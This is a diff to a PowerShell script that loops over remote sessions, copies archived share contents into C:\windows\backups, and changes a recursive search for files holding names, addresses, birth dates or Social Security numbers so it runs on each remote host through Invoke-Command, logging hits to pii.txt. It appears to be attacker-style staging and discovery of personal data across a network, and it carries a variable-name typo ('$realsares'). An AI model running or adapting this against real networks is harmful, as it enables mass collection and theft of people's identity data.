@@ -466,14 +466,17 @@ Get-PSSession | %{
     $realshares | %{Copy-Item "$_-$c.7z" -Destination C:\windows\backups -FromSession $currentsession}
     $paths = 'C:\inetpub\wwwroot','C:\inetpub\ftproot','C:\xampp\apache'
     $paths += $realsares
-    $paths | %{
-        gci -r $_ -erroraction silentlycontinue -exclude *.exe, *.dll, *.lib | %{
-            $content = gc $_.fullname -erroraction silentlycontinue
-            if ($content -match 'name' -and $content -match 'address' -and ($content -match 'dob' -or $content -match 'birth') -or $content -match 'ssn' -or $content -match 'social security number'){
-                $path=$_.fullname; echo "$(hostname):$path"
+    icm -cn $c -argumentlist $paths -command {
+        $args[0] | %{
+            gci -r $_ -erroraction silentlycontinue -exclude *.exe, *.dll, *.lib | %{
+                $content = gc $_.fullname -erroraction silentlycontinue
+                if ($content -match 'name' -and $content -match 'address' -and ($content -match 'dob' -or $content -match 'birth') -or $content -match 'ssn' -or $content -match 'social security number')
+                {
+                    $path=$_.fullname; echo "$(hostname):$path"
+                }
             }
         }
-    }
+    } >> pii.txt
 }
 
 
